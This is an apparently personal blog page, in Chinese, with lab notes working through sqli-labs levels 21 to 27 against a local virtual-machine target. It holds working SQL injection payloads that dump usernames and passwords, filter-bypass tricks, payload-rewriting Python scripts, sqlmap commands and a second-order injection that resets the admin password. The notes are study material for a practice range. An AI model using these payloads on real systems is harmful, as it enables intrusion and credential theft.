@@ -1,0 +1,1216 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      sqli-labs Adv Injections | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「sqli-labs Adv Injections」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2021/12/18/sqli-labs-Adv-Injections/" itemprop="url">
+		sqli-labs Adv Injections
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2021/12/18/sqli-labs-Adv-Injections/" itemprop="url">
+		<time datetime="2021-12-18T12:56:41.000Z" itemprop="dateUpdated">
+	  		2021-12-18
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Web/" class=" ">
+			Web
+		</a>
+	
+		<a href="/tags/SQLi/" class=" ">
+			SQLi
+		</a>
+	
+		<a href="/tags/Web%E9%9D%B6%E5%9C%BA/" class=" ">
+			Web靶场
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="NOTE-sqli-labs-Adv-Injections"><a href="#NOTE-sqli-labs-Adv-Injections" class="headerlink" title="[NOTE] sqli-labs Adv Injections"></a>[NOTE] sqli-labs Adv Injections</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>针对sqli-labs靶场的做题笔记</p>
+<p><strong>环境</strong><br>虚拟机环境<br>攻击机：kali|10.10.10.1<br>靶机：ubuntu|10.10.10.2|Apache+PHP+MySQL</p>
+<h2 id="Less-21-Cookie-injection-base64-encoded-single-quotes-and-parenthesis"><a href="#Less-21-Cookie-injection-base64-encoded-single-quotes-and-parenthesis" class="headerlink" title="Less-21: Cookie injection - base64 encoded-single quotes and parenthesis"></a>Less-21: Cookie injection - base64 encoded-single quotes and parenthesis</h2><p>就是Basic Injection里边的Less-21（重复了？）</p>
+<h2 id="Less-22-Cookie-injection-base64-encoded-single-–-double-quotes"><a href="#Less-22-Cookie-injection-base64-encoded-single-–-double-quotes" class="headerlink" title="Less-22: Cookie injection - base64 encoded-single – double quotes"></a>Less-22: Cookie injection - base64 encoded-single – double quotes</h2><p>和Less-21一样，只不过闭合方式从  ’) 变成了  “<br>下略</p>
+<p>试试sqlmap能不能跑<br><code>sqlmap -r cookieInj --level 5 --risk 3 --cookie=&quot;uanme=*&quot; --tamper=&quot;base64encode&quot;</code><br>关键是指定要探测注入漏洞的cookie字段（注意格式），以及指定编码方式（tamper——篡改）</p>
+<h2 id="Less-23-GET-Error-based-strip-comments"><a href="#Less-23-GET-Error-based-strip-comments" class="headerlink" title="Less-23: GET - Error based - strip comments"></a>Less-23: GET - Error based - strip comments</h2><p>strip comments——注释过滤？应该是做了基本的过滤<br>看眼源码：<br><img src="/2021/12/18/sqli-labs-Adv-Injections/image-20211022212526878.png" alt="image-20211022212526878"><br>用preg_replace()对注释符做了过滤（正则匹配)<br>过滤方法1：主动闭合——<code>?id=&#39; or 1=1 or &#39;</code><br><code>?id=&#39; union select 1,group_concat(username),group_concat(password) from users where &#39;1&#39;=&#39;1</code><br>过滤方法2：00截断——<code>?id=&#39; or 1=1; %00</code>（不知为啥要加个分号)<br><code>?id=&#39; union select 1,group_concat(username),group_concat(password) from users; %00</code></p>
+<h2 id="Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections"><a href="#Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections" class="headerlink" title="Less-24: POST - Second Oder Injections Real treat - Stored Injections"></a>Less-24: POST - Second Oder Injections <em>Real treat</em> - Stored Injections</h2><p>关于这题的<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105620978">学习资料</a></p>
+<p>看了半天源码，是有两个有区别的PHP函数<br><code>mysql_real_escape_string</code><br><code>mysql_escape_string</code></p>
+<p>这关简单模拟了一个系统，注册、登入、重置密码、登出到忘记密码都有<br>其中除注册外，其他地方的输入都使用了<code>mysql_real_escape_string()</code>进行转义<br>而注册的地方使用的是<code>mysql_escape_string()</code>进行转义</p>
+<p>可以上网查一下这两个函数，其中<code>mysql_escape_string</code>不转义“%”和“_”</p>
+<p>关于这题整体，是二次注入，也叫存储型注入<br>大致思路是，先事把含有特殊字符的字符串放到服务器数据库中<br>然后再找到服务器提取该字符串并直接拼接到SQL语句中的场景<br>因为是从数据库中直接提取字符串而不是由用户输入<br>所以很可能是没有做任何过滤就直接拼接的<br>从而绕过一些过滤限制</p>
+<p>这题关键是<strong>重置密码</strong>时，无需用户输入自己的用户名<br>那么很可能就是系统自己从数据库中提取并拼接用户名</p>
+<hr>
+<p>做法</p>
+<p>先自己注册一个账户：<code>admin&#39;#</code>&#x2F;<code>password</code><br>可以注意到这个用户名是合法的，并且会被完整显示出来</p>
+<p>登入这个用户，重置自己的密码为<code>hacked</code></p>
+<p>然后登出，会发现账户<code>admin</code>的密码被改成了<code>hacked</code></p>
+<p>这是因为后台修改账户密码的代码如下：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; WHERE username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code></p>
+<p>其中用户名字段是直接从<code>$_SESSION[&quot;username&quot;]</code>中提取的<br>当拼接上我们自己创建的账户时，就会变成：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; WHERE username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39;</code><br>相当于变成了：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; WHERE username=&#39;admin&#39;</code></p>
+<p>这样就达到了修改管理员账户密码的目的</p>
+<p>这题难度感觉不白盒，很难做出来</p>
+<h2 id="Less-25-GET-Error-based-All-your-OR-AND-belong-to-us-string-single-quote"><a href="#Less-25-GET-Error-based-All-your-OR-AND-belong-to-us-string-single-quote" class="headerlink" title="Less-25: GET - Error based - All your OR &amp; AND belong to us - string single quote"></a>Less-25: GET - Error based - All your OR &amp; AND belong to us - string single quote</h2><p>一样的GET参数<code>id</code><br>题目是，所有的<code>OR</code>和<code>AND</code>都归他了<br>估计是过滤这俩关键字</p>
+<p><code>99&#39;</code>：报错<br><code>99&#39;%23</code>：没有报错<br>估计是字符型注入</p>
+<p>然后payload里面包含<code>and</code>和<code>or</code>，回显出来都不见了<br>说明被过滤了</p>
+<p><del>URL编码不行，concat函数包含字符串的<code>or</code>不行</del><br><del>可能还需要多了解一下编码绕过这块，可能有别的可行方法</del><br>（编码绕过方向全错，我在赣神魔）</p>
+<p>这个payload倒不会报语法错误，但是说列数不同<br><code>?id=&#39; union select (case when (1=1) then 1 else 1 end) %23</code><br>即<code>case-when-then-end</code>可用</p>
+<p>蚌埠住了，看看源码，对参数<code>id</code>做了下黑名单过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><del><code>preg_replace</code>函数：hhhhhh草得去等馆长了</del></p>
+<p><code>preg_replace</code>函数：对目标字符串执行一个正则模式的查找与替换<br>最关键的是，它只会查找并替换一次，<strong>只有一次</strong><br>于是就可以双写绕过了<br>（函数原型好像有一个<code>limit</code>参数指定替换的最大次数？默认是<code>-1</code>无限次？）<br>（可能是指遍历替换的次数，不是递归替换的次数？）</p>
+<p>此外换成<code>||</code>和<code>&amp;&amp;</code>也行，但是后面有些payload还是要双写</p>
+<p>另外注意的是，别的地方出现了<code>or</code>和<code>and</code>都要双写绕过：<br><code>?id=&#39; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database() anandd table_name=&#39;users&#39; %23</code><br>可以考虑写个脚本函数自动执行payload的替换</p>
+<p>原来双写绕过就可以了，一开始还去想什么编码、case-wen啥的<br>终极<strong>眼高手低</strong>，草</p>
+<hr>
+<p>一个绕过过滤的思路：<br>若有过滤，先判断是一次性过滤还是非一次性过滤</p>
+<p><strong>一次性</strong>的话：双写绕过</p>
+<p><strong>非一次性</strong>的话：则要考虑变形</p>
+<ul>
+<li>大小写混拼</li>
+<li>运算符代替：<code>or</code>-&gt;<code>||</code>、<code>and</code>-&gt;<code>&amp;&amp;</code></li>
+<li>URL编码绕过：<code>#</code>-&gt;<code>%23</code></li>
+<li>Hex编码绕过：<code>~</code>-&gt;<code>0x7e</code></li>
+<li>添加注释：<code>/*or*/</code></li>
+</ul>
+<h2 id="Less-25a-GET-Blind-based-All-your-OR-AND-belong-to-us-–-Intiger-based"><a href="#Less-25a-GET-Blind-based-All-your-OR-AND-belong-to-us-–-Intiger-based" class="headerlink" title="Less-25a: GET - Blind based - All your OR &amp; AND belong to us – Intiger based"></a>Less-25a: GET - Blind based - All your OR &amp; AND belong to us – Intiger based</h2><p>题目加个<code>a</code>，估计只是上一题的变式</p>
+<p>字符型注入换成数字型<br>其他地方实际做起来确实和上一题没啥区别，都是双写可绕过</p>
+<p>看看源码，没啥东西<br>倒是有一行<code>print_r(mysql_error())</code>被注释掉了，所以没有错误回显</p>
+<h2 id="Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us"><a href="#Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us" class="headerlink" title="Less-26: GET - Error based - All your SPACES and COMMENTS belong to us"></a>Less-26: GET - Error based - All your SPACES and COMMENTS belong to us</h2><p>看样子是过滤掉了空格和注释<br>结果不是，<code>or</code>和<code>and</code>也被过滤了</p>
+<p>看看源码的过滤函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">	<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">//Strip out --</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">//Strip out #</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">//Strip out spaces</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>关于过滤注释的绕过，一开始想着这样双拼：<code>/*/**/*/</code><br>结果不行，原来过滤的是<code>/*</code><br>所以要这样双拼：<code>//**/**/</code><br>说明绕过的姿势还要放开思路</p>
+<p>验证注入的payload：<code>?id=&#39;//**/**/oorr//**/**/&#39;1&#39;=&#39;1</code></p>
+<p>写了个脚本来做敏感字符得自动化替换：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sys.argv)-<span class="number">1</span>):</span><br><span class="line">        res = sys.argv[i+<span class="number">1</span>]</span><br><span class="line">        res = res.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        res = res.replace(<span class="string">&quot;or&quot;</span>, <span class="string">&quot;oorr&quot;</span>)</span><br><span class="line">        res = res.replace(<span class="string">&quot;and&quot;</span>, <span class="string">&quot;anandd&quot;</span>)</span><br><span class="line">        res = res.replace(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;//**&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    </span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>后面那个注释符目前找不到很好的绕过方法，好像只能通过闭合的方式通过检查</p>
+<p>但是试了试别的payload，发现会报错？例如下面这个爆表：<br><code>&#39;//***/union//***/select//***/1,group_concat(table_name),3//***/from//***/infoorrmation_schema.tables//***/where//***/table_schema=database()//***/anandd//***/&#39;1&#39;=&#39;1</code></p>
+<p>就报了语法错误：<em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘unionselect1,group_concat(table_name),3frominformation_schema.tableswheretable_s’ at line 1</em></p>
+<p>检查一下发现回显也正常，只是空格都被抽掉了<br>（后面检查可能还真是这里的问题，因为后面测出来是只有用空格分隔的SQL语句如“union select”等才会出现这样的问题）<br>那为啥<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105696108">别人</a>可以？<br>所以估计是<code>union select</code>和后面的<code>limit</code>配合得不是很好？<br><del>不会要&#x3D;&#x3D;补习MySQL语法&#x3D;&#x3D;吧….</del></p>
+<hr>
+<p>由于有完整报错回显，考虑使用<code>updatexml</code>、<code>extractvalue</code>等函数</p>
+<p>改进下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">res = sys.argv[<span class="number">1</span>]</span><br><span class="line">res = res.replace(<span class="string">&quot; or &quot;</span>, <span class="string">&quot;||&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot;or&quot;</span>, <span class="string">&quot;oorr&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot;and&quot;</span>, <span class="string">&quot;anandd&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;//**&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>另外空格被过滤，使用<strong>圆括号</strong>是一个不错的分隔办法</p>
+<p>爆库：<code>&#39;||updatexml(1,//**concat(0x7e,//**(select//**database()),//**0x7e),//**1)||&#39;1&#39;=&#39;1</code></p>
+<p>爆表：<br><code>&#39;||updatexml(1,//***/concat(0x7e,//***/(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),//***/0x7e),//***/1)||&#39;1&#39;=&#39;2</code></p>
+<p>爆字段：<br><code>&#39;||updatexml(1,//***/concat(0x7e,//***/(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),//***/0x7e),//***/1)||&#39;1&#39;=&#39;2</code></p>
+<p>爆数据：<br><code>&#39;||updatexml(1,//***/concat(0x7e,//***/(select(group_concat(username))from(users)limit%0B0,1),//***/0x7e),//***/1)||&#39;1&#39;=&#39;2</code></p>
+<p>但是到这里问题又来了<br>由于报错会限制回显的字符数，所以需要使用<code>limit 0,1</code>来作偏移<br>但是这样的话就免不了又要使用空格或别的分隔符<br>然后就会被抽走，然后又报语法错误：</p>
+<p>payload：<code>&#39;||updatexml(1,//***/concat(0x7e,//***/(select(group_concat(username))from(users)limit//***/0,1),//***/0x7e),//***/1)||&#39;1&#39;=&#39;2</code><br>报错回显：<em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘limit0,1),0x7e),1)||’1’&#x3D;’2’ LIMIT 0,1’ at line 1</em></p>
+<p>上面的‘limit’和‘0’接在一起了，去掉这个<code>limit</code>就没事</p>
+<hr>
+<p>那后面剩下的就上盲注吧<br>额不对，盲注数据好像也要用到<code>limit</code>？那咋办啊</p>
+<p>我不理解，为什么别人和在数据库里使用<code>/**/</code>代替空格就行<br>换到sqli-labs就不行….<br><del>不会又是垃圾小皮的锅吧。。。。</del></p>
+<p>上sqlmap看看<br>能测出DBMS是MySQL，参数<code>id</code>可以注入，但是后面就测不动了<br>可能要指定别的参数啥的</p>
+<h2 id="Less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-–-String-single-quotes-Parenthesis"><a href="#Less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-–-String-single-quotes-Parenthesis" class="headerlink" title="Less-26a: GET - Blind Based - All your SPACES and COMMENTS belong to us – String-single quotes-Parenthesis"></a>Less-26a: GET - Blind Based - All your SPACES and COMMENTS belong to us – String-single quotes-Parenthesis</h2><p>估计是和上题差不多，有些变形，而且提示了是基于盲注</p>
+<p>测了测，发现闭合要加多个<code>)</code><br>关闭了错误回显，所以<code>updatexml</code>这类路走不通了</p>
+<p>贴个验证注入存在的payload：<code>&#39;)||1=1||(&#39;1&#39;)=(&#39;2</code></p>
+<p>盲注要用到也要<code>limit</code>，那咋整啊</p>
+<h2 id="Less-27-GET-Error-Based-All-your-UNION-SELECT-Belong-to-us-–-String-–-String-quote"><a href="#Less-27-GET-Error-Based-All-your-UNION-SELECT-Belong-to-us-–-String-–-String-quote" class="headerlink" title="Less-27: GET - Error Based - All your UNION &amp; SELECT Belong to us – String – String quote"></a>Less-27: GET - Error Based - All your UNION &amp; SELECT Belong to us – String – String quote</h2><p>看样子是过滤掉了<code>union</code>和<code>select</code>，估计还有别的</p>
+<p>验证一下：<code>?id=&#39; or 1=1 %23</code><br>回显：<em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘or1&#x3D;1’ LIMIT 0,1’ at line 1</em><br>看样子之前过滤的这次也过滤了<br>得用回之前的脚本来做字段替换</p>
+<p>看眼过滤函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces.</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces.</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces.</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out union</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out select</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out UNION</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out SELECT</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out Union</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察一下，发现分隔符只过滤了空格和<code>/*</code>，也就是说制表符<code>%09</code>可用<br><code>union</code>和<code>select</code>过滤也不完整，大小写混拼可用<br>没有过滤<code>or</code>和<code>and</code><br>注释符不可用</p>
+<p>那比上一题简单了呀，<code>updatexml</code>注入走起！</p>
+<hr>
+<p>payload替换脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">res = sys.argv[<span class="number">1</span>]</span><br><span class="line">res = res.replace(<span class="string">&quot;union&quot;</span>, <span class="string">&quot;UnIoN&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot;select&quot;</span>, <span class="string">&quot;SeLeCt&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%09&quot;</span>)</span><br><span class="line">res = res.replace(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;//**&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>爆库：<br><code>&#39;%09or%09updatexml(1,%09(concat(0x7e,%09(SeLeCt%09database()),%090x7e)),%091)%09or%09&#39;1&#39;=&#39;1</code></p>
+<p>爆表：<br><code>&#39;%09or%09updatexml(1,%09(concat(0x7e,%09(SeLeCt%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),%090x7e)),%091)%09or%09&#39;1&#39;=&#39;2</code></p>
